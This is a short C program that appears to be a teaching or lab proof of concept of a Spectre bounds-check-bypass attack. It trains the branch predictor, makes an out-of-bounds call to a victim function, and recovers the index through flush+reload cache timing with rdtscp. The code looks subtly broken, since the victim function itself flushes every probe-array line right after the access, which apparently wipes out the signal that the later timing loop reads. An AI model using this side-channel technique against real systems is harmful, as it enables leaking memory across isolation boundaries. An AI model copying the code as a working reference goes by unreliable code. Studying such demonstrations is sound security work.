
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

int size = 10;
uint8_t array[256*4096];
uint8_t temp = 0;
#define CACHE_HIT_THRESHOLD (100) 
#define DELTA 1024

void victim(size_t x)
{
  int i;
  if (x < size) {  
  	temp = array[x * 4096 + DELTA]; 
  }
  // For flushing and filling the cache with 00000000000000000


  for (i = 0; i < 256; i++) 
  {
  	array[i*4096 + DELTA] = 0;
  }
  for (i = 0; i < 256; i++) 
  {
  	_mm_clflush(&array[i*4096 +DELTA]);
  }
  //flush code ends here
}

int main() {
  int i;
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  
  // For flushing and filling the cache with 00000000000000000


  for (i = 0; i < 256; i++) 
  {
  	array[i*4096 + DELTA] = 0;
  }
  for (i = 0; i < 256; i++) 
  {
  	_mm_clflush(&array[i*4096 +DELTA]);
  }
  //flush code ends here


  // this is for training the processor by calling the victim function multiple time
  for (i = 0; i < 10; i++) {   
   	_mm_clflush(&size); 
   	victim(i);
  }
  // traing ends here
  
  _mm_clflush(&size);
  for (i = 0; i < 256; i++)
  {
  	_mm_clflush(&array[i*4096 + DELTA]); 
  }
  

  //now puting the key into the cache (89 can be change into any number thats bigger then 10 but smaller than 256).
  victim(89);  
  
  // this is the analysis function, this is to test all the number from 0 - 256 one by one. if the number is present in the cache. the cache hit time will be significant lower if the time is lower than the cache hit treshold. we found the key 
  // u can un-comment line 64 to see the sample out put for the times
  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    //printf("%d time taken = %d.\n",i , time2);
    if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
    }
  } 
  // analysis function ends





  return (0); 
}
